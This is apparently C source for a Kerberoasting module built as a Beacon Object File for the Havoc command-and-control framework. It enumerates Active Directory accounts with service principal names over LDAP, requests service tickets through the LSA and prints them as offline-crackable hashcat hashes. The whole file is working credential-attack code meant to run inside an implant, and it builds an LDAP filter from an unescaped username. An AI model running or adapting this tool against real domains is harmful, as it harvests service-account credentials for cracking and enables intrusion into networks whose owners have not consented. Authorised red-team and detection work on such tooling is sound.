#include "kerberoast.h"
#include "tgtdeleg.h"
#include <winldap.h>
#include <stdarg.h>

/*
 * Kerberoasting via the LSA "KerbRetrieveEncodedTicketMessage" path (the same
 * mechanism Rubeus uses) — a fresh TGS service ticket is requested from the
 * KDC through the local LSA (using the current user's TGT), returned as a
 * KRB_CRED, decoded with the Kerberos ASN.1 module, and the ticket's
 * encrypted part is emitted as an offline-crackable hash.
 *
 * MODES (dispatched on the first argument):
 *   kerberoast                     -> enumerate ALL user SPNs via LDAP, roast each
 *   kerberoast <username>          -> enumerate that account's SPNs, roast each
 *   kerberoast <spn> [username]    -> literal SPN (contains '/'), roast just it
 *
 * Disambiguation: an argument containing '/' is treated as a literal SPN;
 * anything else is treated as a sAMAccountName to look up over LDAP.
 *
 * OUTPUT CONTRACT: everything is buffered via roast_printf() and flushed in
 * ONE BeaconOutput(CALLBACK_OUTPUT, ...) at the end. The old code called
 * BeaconPrintf per line (and per hex byte), which made the demon emit
 * hundreds of "[+] Received Output [N bytes]" chunks and dropped the hash.
 *
 * Hash format (hashcat):
 *   RC4 (etype 23, mode 13100):      $krb5tgs$23$*user$realm$spn*$<16b>$<rest>
 *   AES (etype 17/18, 19600/19700):  $krb5tgs$<etype>$user$realm$<16b>$<rest>
 */

/* MSVCRT$vsnprintf is not declared in the vendored bofdefs.h — declare it here
   (the demon's $-split import loader resolves __imp_MSVCRT$vsnprintf). */
WINBASEAPI int __cdecl MSVCRT$vsnprintf(char* _Dst, size_t _MaxCount, const char* _Format, va_list _ArgList);

/* ---- WLDAP32 (static $-imports; wldap32.dll exports these exact names) ---- */
WINBASEAPI LDAP*        LDAPAPI WLDAP32$ldap_init(PSTR HostName, ULONG PortNumber);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_set_option(LDAP* ld, int option, const void* invalue);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_bind_s(LDAP* ld, const PSTR dn, const PCHAR cred, ULONG method);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_search_s(LDAP* ld, const PSTR base, ULONG scope,
                                                      const PSTR filter, PSTR attrs[],
                                                      ULONG attrsonly, LDAPMessage** res);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_count_entries(LDAP* ld, LDAPMessage* res);
WINBASEAPI LDAPMessage* LDAPAPI WLDAP32$ldap_first_entry(LDAP* ld, LDAPMessage* res);
WINBASEAPI LDAPMessage* LDAPAPI WLDAP32$ldap_next_entry(LDAP* ld, LDAPMessage* entry);
WINBASEAPI PCHAR*       LDAPAPI WLDAP32$ldap_get_values(LDAP* ld, LDAPMessage* entry, const PSTR attr);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_value_free(PCHAR* vals);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_msgfree(LDAPMessage* res);
WINBASEAPI ULONG        LDAPAPI WLDAP32$ldap_unbind(LDAP* ld);

#define ROAST_BUFSIZE 65536

/* Global output buffer. Initialized to non-zero sentinels so the globals land
   in .data rather than .bss (the Havoc BOF loader does not zero .bss — the
   same reason base.c uses `char * output = (char*)1`). execute_kerberoast()
   allocates the real buffer and resets the length before the first print. */
static char* roast_out = (char*)1;
static int   roast_len = 1;

/* Flush the accumulated output as ONE chunk. */
static void roast_flush(void)
{
    if (roast_out != NULL && roast_out != (char*)1 && roast_len > 0)
        BeaconOutput(CALLBACK_OUTPUT, roast_out, roast_len);
    roast_len = 0;
}

/* Buffer a formatted string. On overflow, flush-then-append so an oversized
   result still arrives intact (mirror base.c's internal_printf). */
static void roast_printf(const char* fmt, ...)
{
    va_list ap;
    char    tmp[2048];
    int     n;

    if (roast_out == NULL || roast_out == (char*)1)
        return;

    va_start(ap, fmt);
    n = MSVCRT$vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);

    if (n <= 0)
        return;
    if (n >= (int)sizeof(tmp))
        n = (int)sizeof(tmp) - 1;

    if (roast_len + n >= ROAST_BUFSIZE)
        roast_flush();

    MSVCRT$memcpy(roast_out + roast_len, tmp, (size_t)n);
    roast_len += n;
    roast_out[roast_len] = '\0';
}

/* Return 1 if the string contains a '/' (SPN detection). */
static int HasSlash(const char* s)
{
    if (s == NULL)
        return 0;
    for (; *s; s++)
        if (*s == '/')
            return 1;
    return 0;
}

/* Join a KERB_PRINCIPAL_NAME name_string linked list into a single
   "component1/component2/..." narrow string. Heap-allocated, caller frees. */
static char* BuildSpn(PKERB_PRINCIPAL_NAME_name_string nameString)
{
    size_t total = 0;
    int    count = 0;
    PKERB_PRINCIPAL_NAME_name_string p;

    for (p = nameString; p != NULL; p = p->next) {
        if (p->value != NULL) {
            total += MSVCRT$strlen(p->value);
            count++;
        }
    }
    if (count == 0)
        return NULL;
    total += (size_t)(count - 1); /* '/' separators */

    char* spn = (char*)MSVCRT$calloc(total + 1, sizeof(char));
    if (spn == NULL)
        return NULL;

    char* d = spn;
    int   i = 0;
    for (p = nameString; p != NULL; p = p->next) {
        if (p->value == NULL)
            continue;
        if (i > 0)
            *d++ = '/';
        size_t len = MSVCRT$strlen(p->value);
        MSVCRT$memcpy(d, p->value, len);
        d += len;
        i++;
    }
    *d = '\0';
    return spn;
}

/* Append the ciphertext as two hex fields split after 16 bytes:
   <first16hex>$<remaininghex>. Both RC4 and AES kerberoast hashes use this
   split (the first 16 bytes are the encrypted checksum/confounder). */
static void PrintCipherSplit(const UCHAR* cipherText, int cipherTextSize)
{
    int i;
    for (i = 0; i < cipherTextSize; i++) {
        if (i == 16)
            roast_printf("$");
        roast_printf("%.2x", cipherText[i]);
    }
}

/* Roast a single SPN through a shared LSA connection. Prints one hash line. */
static void RoastSpn(HANDLE hLsa, ULONG authPackage, const char* spn, const char* user)
{
    WCHAR* wTarget = GetWideString(spn);
    if (wTarget == NULL) {
        roast_printf("[!] %s: could not allocate SPN buffer\n", spn);
        return;
    }

    USHORT dwTarget    = (USHORT)((MSVCRT$wcslen(wTarget) + 1) * sizeof(WCHAR));
    ULONG  requestSize = dwTarget + sizeof(KERB_RETRIEVE_TKT_REQUEST);
    PKERB_RETRIEVE_TKT_REQUEST request =
        (PKERB_RETRIEVE_TKT_REQUEST)MSVCRT$calloc(requestSize, 1);
    if (request == NULL) {
        roast_printf("[!] %s: could not allocate request buffer\n", spn);
        MSVCRT$free(wTarget);
        return;
    }

    request->MessageType    = KerbRetrieveEncodedTicketMessage;
    request->LogonId        = (LUID){.HighPart = 0, .LowPart = 0};
    request->CacheOptions   = KERB_RETRIEVE_TICKET_AS_KERB_CRED; /* ask KDC, return KRB_CRED */
    request->EncryptionType = 0;
    request->TargetName.Length        = dwTarget - sizeof(WCHAR);
    request->TargetName.MaximumLength = dwTarget;
    request->TargetName.Buffer        = (PWSTR)((PBYTE)request + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    MSVCRT$memcpy(request->TargetName.Buffer, wTarget, dwTarget);
    MSVCRT$free(wTarget);

    PKERB_RETRIEVE_TKT_RESPONSE response = NULL;
    ULONG  responseSize = 0;
    NTSTATUS protocolStatus = 0;
    NTSTATUS status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize,
                                                           &response, &responseSize, &protocolStatus);
    MSVCRT$free(request);

    if (!NT_SUCCESS(status) || !NT_SUCCESS(protocolStatus)) {
        roast_printf("[!] %s: LSA failed status 0x%lx protocol 0x%lx\n",
                     spn, (unsigned long)ADVAPI32$LsaNtStatusToWinError(status),
                     (unsigned long)ADVAPI32$LsaNtStatusToWinError(protocolStatus));
        if (response) SECUR32$LsaFreeReturnBuffer(response);
        return;
    }
    if (response == NULL || response->Ticket.EncodedTicket == NULL ||
        response->Ticket.EncodedTicketSize < 1) {
        roast_printf("[!] %s: no ticket returned\n", spn);
        if (response) SECUR32$LsaFreeReturnBuffer(response);
        return;
    }

    ASN1module_t module = KRB5_Module_Startup();
    if (module == NULL) {
        roast_printf("[!] %s: could not create ASN.1 module\n", spn);
        SECUR32$LsaFreeReturnBuffer(response);
        return;
    }

    KERB_CRED* cred = NULL;
    KERBERR kerbError = KerbUnpackData(module, response->Ticket.EncodedTicket,
                                       response->Ticket.EncodedTicketSize,
                                       KERB_CRED_PDU, (PVOID*)&cred);
    if (!KERB_SUCCESS(kerbError) || cred == NULL || cred->tickets == NULL) {
        roast_printf("[!] %s: failed to unpack KRB_CRED: 0x%x\n", spn, kerbError);
        KRB5_Module_Cleanup(module);
        SECUR32$LsaFreeReturnBuffer(response);
        return;
    }

    KERB_TICKET* tkt             = &cred->tickets->value;
    int          encType         = tkt->encrypted_part.encryption_type;
    int          cipherTextSize  = tkt->encrypted_part.cipher_text.length;
    UCHAR*       cipherText      = tkt->encrypted_part.cipher_text.value;
    KERB_REALM   realm           = tkt->realm;
    char*        serviceSpn      = BuildSpn(tkt->server_name.name_string);

    if (serviceSpn == NULL) {
        roast_printf("[!] %s: could not parse server name\n", spn);
        KerbFreeData(module, KERB_CRED_PDU, cred);
        KRB5_Module_Cleanup(module);
        SECUR32$LsaFreeReturnBuffer(response);
        return;
    }
    if (cipherText == NULL || cipherTextSize < 16) {
        roast_printf("[!] %s: ciphertext missing or too short (%d bytes)\n", spn, cipherTextSize);
        MSVCRT$free(serviceSpn);
        KerbFreeData(module, KERB_CRED_PDU, cred);
        KRB5_Module_Cleanup(module);
        SECUR32$LsaFreeReturnBuffer(response);
        return;
    }

    roast_printf("[*] SPN: %s (etype %s, %d bytes)\n",
                 serviceSpn, GetEncryptionTypeString(encType), cipherTextSize);

    if (encType == 17 || encType == 18) {
        /* hashcat mode 19600 (etype 17) / 19700 (etype 18):
           $krb5tgs$<etype>$<user>$<realm>$<16b>$<rest> */
        roast_printf("$krb5tgs$%d$%s$%s$", encType, user, realm);
        PrintCipherSplit(cipherText, cipherTextSize);
        roast_printf("\n");
    } else if (encType == 23) {
        /* hashcat mode 13100 (etype 23):
           $krb5tgs$23$*<user>$<realm>$<spn>*$<16b>$<rest> */
        roast_printf("$krb5tgs$23$*%s$%s$%s*$", user, realm, serviceSpn);
        PrintCipherSplit(cipherText, cipherTextSize);
        roast_printf("\n");
    } else {
        roast_printf("[!] %s: unsupported encryption type %s (%d)\n",
                     serviceSpn, GetEncryptionTypeString(encType), encType);
    }

    MSVCRT$free(serviceSpn);
    KerbFreeData(module, KERB_CRED_PDU, cred);
    KRB5_Module_Cleanup(module);
    SECUR32$LsaFreeReturnBuffer(response);
}

/* Open + bind an LDAP connection to the default domain controller. */
static LDAP* LdapConnect(void)
{
    LDAP* ld = WLDAP32$ldap_init(NULL, 389);
    if (ld == NULL)
        return NULL;

    ULONG version = LDAP_VERSION3;
    WLDAP32$ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);

    ULONG rc = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (rc != LDAP_SUCCESS) {
        WLDAP32$ldap_unbind(ld);
        return NULL;
    }
    return ld;
}

/* Read the defaultNamingContext (domain DN) from the rootDSE. */
static char* LdapGetBaseDn(LDAP* ld)
{
    LDAPMessage* res = NULL;
    PCHAR attrs[2] = { "defaultNamingContext", NULL };
    ULONG rc = WLDAP32$ldap_search_s(ld, NULL, LDAP_SCOPE_BASE, "(objectclass=*)", attrs, 0, &res);
    if (rc != LDAP_SUCCESS || res == NULL)
        return NULL;

    char* dn = NULL;
    LDAPMessage* e = WLDAP32$ldap_first_entry(ld, res);
    if (e != NULL) {
        PCHAR* vals = WLDAP32$ldap_get_values(ld, e, "defaultNamingContext");
        if (vals != NULL && vals[0] != NULL) {
            size_t l = MSVCRT$strlen(vals[0]);
            dn = (char*)MSVCRT$calloc(l + 1, 1);
            if (dn != NULL)
                MSVCRT$memcpy(dn, vals[0], l);
        }
        if (vals != NULL)
            WLDAP32$ldap_value_free(vals);
    }
    WLDAP32$ldap_msgfree(res);
    return dn;
}

/* Enumerate SPNs (for one account, or all user accounts) and roast each.
   Sets *outCount to the number of hashes emitted. */
static void LdapEnumSpns(LDAP* ld, const char* baseDn, const char* username,
                         HANDLE hLsa, ULONG authPackage, int* outCount)
{
    const char* allFilter =
        "(&(samAccountType=805306368)(!samAccountName=krbtgt)"
        "(serviceprincipalname=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";

    char* filter;
    if (username != NULL && username[0] != '\0') {
        size_t len = MSVCRT$strlen(username) + 128;
        filter = (char*)MSVCRT$calloc(len, 1);
        if (filter == NULL) {
            *outCount = 0;
            return;
        }
        MSVCRT$sprintf(filter,
                       "(&(sAMAccountName=%s)(servicePrincipalName=*)"
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))",
                       username);
    } else {
        filter = (char*)MSVCRT$calloc(MSVCRT$strlen(allFilter) + 1, 1);
        if (filter == NULL) {
            *outCount = 0;
            return;
        }
        MSVCRT$memcpy(filter, allFilter, MSVCRT$strlen(allFilter));
    }

    PCHAR attrs[3] = { "sAMAccountName", "servicePrincipalName", NULL };
    LDAPMessage* res = NULL;
    ULONG rc = WLDAP32$ldap_search_s(ld, baseDn, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &res);
    MSVCRT$free(filter);

    if (rc != LDAP_SUCCESS || res == NULL) {
        roast_printf("[!] LDAP search failed: 0x%lx\n", (unsigned long)rc);
        if (res != NULL) WLDAP32$ldap_msgfree(res);
        *outCount = 0;
        return;
    }

    int count = 0;
    LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, res);
    while (entry != NULL) {
        PCHAR* sam  = WLDAP32$ldap_get_values(ld, entry, "sAMAccountName");
        PCHAR* spns = WLDAP32$ldap_get_values(ld, entry, "servicePrincipalName");
        const char* user = (sam != NULL && sam[0] != NULL) ? sam[0] : "USER";

        if (spns != NULL) {
            for (int i = 0; spns[i] != NULL; i++) {
                roast_printf("\n");
                RoastSpn(hLsa, authPackage, spns[i], user);
                count++;
            }
            WLDAP32$ldap_value_free(spns);
        }
        if (sam != NULL)
            WLDAP32$ldap_value_free(sam);

        entry = WLDAP32$ldap_next_entry(ld, entry);
    }
    WLDAP32$ldap_msgfree(res);
    *outCount = count;
}

void execute_kerberoast(WCHAR** dispatch, char* arg1, char* arg2)
{
    /* Allocate + prime the output buffer BEFORE any roast_printf() call. */
    roast_out = (char*)MSVCRT$calloc(ROAST_BUFSIZE, 1);
    roast_len = 0;
    if (roast_out == NULL) {
        roast_out = (char*)1;
        roast_len = 1;
        return;
    }

    const int literalSpn = HasSlash(arg1);

    /* Shared LSA context for every roast. Untrusted is sufficient (Rubeus). */
    HANDLE hLsa = NULL;
    NTSTATUS status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (!NT_SUCCESS(status)) {
        roast_printf("[!] LsaConnectUntrusted failed: 0x%lx\n", (unsigned long)status);
        goto done;
    }

    ULONG authPackage = 0;
    LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage);
    if (!NT_SUCCESS(status)) {
        roast_printf("[!] LsaLookupAuthenticationPackage failed: 0x%lx\n",
                     (unsigned long)ADVAPI32$LsaNtStatusToWinError(status));
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        goto done;
    }

    if (literalSpn) {
        const char* user = (arg2 != NULL && arg2[0] != '\0') ? arg2 : "USER";
        RoastSpn(hLsa, authPackage, arg1, user);
    } else {
        const char* username = (arg1 != NULL && arg1[0] != '\0') ? arg1 : NULL;

        LDAP* ld = LdapConnect();
        if (ld == NULL) {
            roast_printf("[!] LDAP connect/bind failed (not domain-joined?)\n");
            SECUR32$LsaDeregisterLogonProcess(hLsa);
            goto done;
        }
        char* baseDn = LdapGetBaseDn(ld);
        if (baseDn == NULL) {
            roast_printf("[!] Could not read defaultNamingContext\n");
            WLDAP32$ldap_unbind(ld);
            SECUR32$LsaDeregisterLogonProcess(hLsa);
            goto done;
        }

        roast_printf("[*] Enumerating SPNs%s%s\n",
                     username != NULL ? " for " : " (all user accounts)",
                     username != NULL ? username : "");

        int count = 0;
        LdapEnumSpns(ld, baseDn, username, hLsa, authPackage, &count);
        roast_printf("\n[*] Roasted %d SPN(s)\n", count);

        MSVCRT$free(baseDn);
        WLDAP32$ldap_unbind(ld);
    }

    SECUR32$LsaDeregisterLogonProcess(hLsa);

done:
    roast_flush();
    if (roast_out != NULL && roast_out != (char*)1)
        MSVCRT$free(roast_out);
    roast_out = (char*)1;
    roast_len = 1;
}
